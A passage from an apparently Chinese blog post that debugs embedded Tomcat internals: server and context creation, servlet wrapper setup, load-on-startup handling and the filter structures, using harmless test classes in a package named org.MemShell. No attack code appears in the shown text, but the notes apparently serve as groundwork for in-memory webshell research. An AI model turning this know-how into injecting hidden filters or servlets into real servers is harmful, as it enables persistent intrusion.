</span><br><span class="line">tomcat.getConnector();</span><br></pre></td></tr></table></figure><p>创建tomcat建议启动器实例, 获取Connector, 跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160040.png" alt="image.png"><br>这里getService跟进去是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Service <span class="title function_">getService</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> getServer().findServices()[<span class="number">0</span>];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getServer跟进去是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Server <span class="title function_">getServer</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (server != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> server;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    System.setProperty(<span class="string">&quot;catalina.useNaming&quot;</span>, <span class="string">&quot;false&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    server = <span class="keyword">new</span> <span class="title class_">StandardServer</span>();  </span><br><span class="line">  </span><br><span class="line">    initBaseDir();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Set configuration source  </span></span><br><span class="line">    ConfigFileLoader.setSource(<span class="keyword">new</span> <span class="title class_">CatalinaBaseConfigurationSource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(basedir), <span class="literal">null</span>));  </span><br><span class="line">  </span><br><span class="line">    server.setPort( -<span class="number">1</span> );  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Service</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardService</span>();  </span><br><span class="line">    service.setName(<span class="string">&quot;Tomcat&quot;</span>);  </span><br><span class="line">    server.addService(service);  </span><br><span class="line">    <span class="keyword">return</span> server;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最终是<code>getServer</code>方法创建了一个<code>StandardServer</code>, 并实例化一个<code>StandardService</code>添加到创建的<code>StandardServer</code>中</p><p>之后创建一个连接器, 添加给service,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722160530.png" alt="image.png"><br>也就是说是<code>tomcat.getConnector();</code>这句创建了&#x3D;&#x3D;Server&#x3D;&#x3D;和&#x3D;&#x3D;service&#x3D;&#x3D;以及service中的&#x3D;&#x3D;连接器&#x3D;&#x3D;</p><p>继续看下一句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());</span><br></pre></td></tr></table></figure><p>断点进到<code>addWebapp</code>中去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722163236.png" alt="image.png"></p><p>可以跟进<code>getHost</code>方法, 这里和之前的逻辑一样, 有则返回, 无则创建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Host <span class="title function_">getHost</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">Engine</span> <span class="variable">engine</span> <span class="operator">=</span> getEngine();  </span><br><span class="line">    <span class="keyword">if</span> (engine.findChildren().length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> (Host) engine.findChildren()[<span class="number">0</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardHost</span>();  </span><br><span class="line">    host.setName(hostname);  </span><br><span class="line">    getEngine().addChild(host);  </span><br><span class="line">    <span class="keyword">return</span> host;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是创建了<code>engine</code>并为其创建了一个<code>host</code>, 这个host默认绑定在<code>localhost</code>, 并将该host作为<code>engine</code>的child, 这也就是组合模式的运用</p><p>跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722164542.png" alt="image.png"><br>创建了一个<code>LifecycleListener</code>, 是一个空的ContextConfig<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722165419.png" alt="image.png"></p><p>再跟进addWebapp<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171149.png" alt="image.png"></p><p>为host创建了一个context, 并配置了该context的默认监听器 (观察者)<br>在此时候context也就创建好了</p><p>之后看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);</span><br></pre></td></tr></table></figure><p>首先是<code>addServlet</code>为现有的context创建了一个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722171955.png" alt="image.png"></p><p>addServletMappingDecoded 添加了映射<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722172913.png" alt="image.png"></p><p>到这里该创建的都创建了<br>之后就会进入到init和start的流程, 和上面的泳道图中的流程基本一致</p><p>有一点不同在于下图中的过程<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722223729.png" alt="image.png"></p><p>在调试时发现这里应该是先执行&#x3D;&#x3D;<code>DefaultWebXmlListener</code>&#x3D;&#x3D;监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230011.png" alt="image.png"></p><p>这个监听器是<code>org.apache.catalina.startup.Tomcat</code>里定义的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230133.png" alt="image.png"><br>看注释可以知道这个监听器是用来代替传统启动方式的<code>$CATALINA_HOME/conf/web.xml</code>配置启动的, 这样就相当于它代替了<code>org.apache.catalina.startup.ContextConfig</code>这个监听器的任务, 再来看<code>ContextConfig</code>监听器, 它的<code>defaultWebXml</code>被赋值为了<code>org/apache/catalina/startup/NO_DEFAULT_XML</code>(即不采用默认xml配置文件) 也证实了这一点</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722230643.png" alt="image.png"></p><p>跟进<code>DefaultWebXmlListener</code>监听器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231231.png" alt="image.png"><br>addServlet创建servlet对应的wrapper后, 将其添加到context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"></p><p>最后会启动这个wrapper<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232056.png" alt="image.png"></p><p>再看ContextConfig监听器<br>可以在此处打条件断点进去<br><code>listener.getClass().getName().equals(&quot;org.apache.catalina.startup.ContextConfig&quot;)</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235322.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722235356.png" alt="image.png"><br>如果是传统的配置文件启动, 会进入<code>configureStart();</code>, 这里并不是就不会进去. </p><h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><h4 id="servlet初始化流程分析"><a href="#servlet初始化流程分析" class="headerlink" title="servlet初始化流程分析"></a>servlet初始化流程分析</h4><p>断点打在<code>org.apache.catalina.core.StandardWrapper#setServletClass</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723002635.png" alt="image.png"></p><p>根据上面的调试StandardWrapper#setServletClass的上层调用有两种情况<br>一种是<code>DefaultWebXmlListener</code> , 一种是<code>ContextConfig</code><br>先来看<code>DefaultWebXmlListener</code><br>它会触发到<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722231304.png" alt="image.png"></p><p>这里可以看见关键的三步</p><ul><li><p>&#x3D;&#x3D;创建servlet&#x3D;&#x3D;(<code>addServlet</code>)</p></li><li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p></li><li><p>将<code>url</code>和<code>servlet</code>类做映射<br>再看创建Servlet的逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722232232.png" alt="image.png"><br>创建Servlet又分为</p></li><li><p>创建<code>Wapper</code>对象</p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p></li><li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中<br>因此初始化Servlet分为</p></li><li><p>创建<code>Wapper</code>对象</p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的<code>class</code></p></li><li><p>设置<code>Wapper</code>中<code>Servlet</code>的名称</p></li><li><p>将配置好的<code>Wrapper</code>添加到<code>Context</code>中</p></li><li><p>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值</p></li><li><p>将<code>url</code>和<code>servlet</code>类做映射</p></li></ul><p><strong>再来看<code>ContextConfig</code></strong><br>在configureContext方法中同样会调用到<code>wrapper.setServletClass(servlet.getServletClass());</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;  </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();  </span><br><span class="line">    <span class="comment">// Description is ignored  </span></span><br><span class="line">    <span class="comment">// Display name is ignored    // Icons are ignored  </span></span><br><span class="line">    <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param  </span></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setName(servlet.getServletName());  </span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();  </span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;  </span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());  </span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();  </span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;  </span><br><span class="line">        wrapper.addSecurityReference(  </span><br><span class="line">                roleRef.getName(), roleRef.getLink());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());  </span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();  </span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;  </span><br><span class="line">            maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;  </span><br><span class="line">            maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;  </span><br><span class="line">            fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(  </span><br><span class="line">                multipartdef.getLocation(),  </span><br><span class="line">                maxFileSize,  </span><br><span class="line">                maxRequestSize,  </span><br><span class="line">                fileSizeThreshold));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;  </span><br><span class="line">        wrapper.setAsyncSupported(  </span><br><span class="line">                servlet.getAsyncSupported().booleanValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());  </span><br><span class="line">    context.addChild(wrapper);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :  </span><br><span class="line">        webxml.getServletMappings().entrySet()) &#123;  </span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是完成了上面6个步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">...</span><br><span class="line">wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">...</span><br><span class="line">wrapper.setName(servlet.getServletName());</span><br><span class="line">...</span><br><span class="line">wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">...</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">...</span><br><span class="line">context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="servlet装载流程分析"><a href="#servlet装载流程分析" class="headerlink" title="servlet装载流程分析"></a>servlet装载流程分析</h4><p>断点在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723154556.png" alt="image.png"><br>寻找其上层调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155407.png" alt="image.png"><br>这里注释写的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Load and initialize all &quot;load on startup&quot; servlets</span><br></pre></td></tr></table></figure><p>说明是启动所有标记为<code>LoadOnStartUp</code>d的servlet</p><p>并且在此之前执行了<br><code>listenerStart()</code> 和 <code>filterStart()</code> 启动listener和filter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723155708.png" alt="image.png"></p><p>再看loadOnStartup方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized  </span></span><br><span class="line">    TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;  </span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();  </span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">continue</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);  </span><br><span class="line">        map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets  </span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                wrapper.load();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;  </span><br><span class="line">                getLogger().error(  </span><br><span class="line">                        sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),  </span><br><span class="line">                        StandardWrapper.getRootCause(e));  </span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws  </span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT                </span></span><br><span class="line">                <span class="comment">// fatal to application startup                </span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;  </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loadOnStartup</code> &lt; 0 就不加载(只有访问到时才加载)<br>将loadOnStartup &gt;&#x3D; 0 的创建一个treeMap, treeMap的键为loadOnStartup的值, reeMap的值 为ArrayList, 里面存储需要加载的Wrapper(Servlet)<br>之后遍历整个treeMap加载</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723214431.png" alt="image.png"></p><h4 id="tomcat源码调试"><a href="#tomcat源码调试" class="headerlink" title="tomcat源码调试"></a>tomcat源码调试</h4><p>这里使用传统方式启动tomcat而不是嵌入式,<br>要调试这个非嵌入式的tomcat, 网上很多教程都很繁琐且不太靠谱,<br>可以直接添加嵌入式tomcat的源码来调试, 版本保持一致即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.107<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>TestFilter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter doFilter &quot;</span>);  </span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter destroy&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TestServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tomcat会自动扫描到并加载我们编写的filter<br>断点打在编写的doFilter方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723201259.png" alt="image.png"></p><h4 id="请求如何到达Filter"><a href="#请求如何到达Filter" class="headerlink" title="请求如何到达Filter"></a>请求如何到达Filter</h4><p>具体调试过程就不记录了<br>总之调试加阅读tomcat架构原理可以理出以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724003839.png" alt="image.png"><br>Wrapper的最后一个Valve也就是StandardWrapperValve会创建一个Filter链并进行调用</p><h4 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h4><p>&#x3D;&#x3D;&#x3D;<code>FilterDef</code>&#x3D;&#x3D;是过滤器的抽象定义，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；</p><p>&#x3D;&#x3D;<code>FilterConfigs</code>&#x3D;&#x3D;, 